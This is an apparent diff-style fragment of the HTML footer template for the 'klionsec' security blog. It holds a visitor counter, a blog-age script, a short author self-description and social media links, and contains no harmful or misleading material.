+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
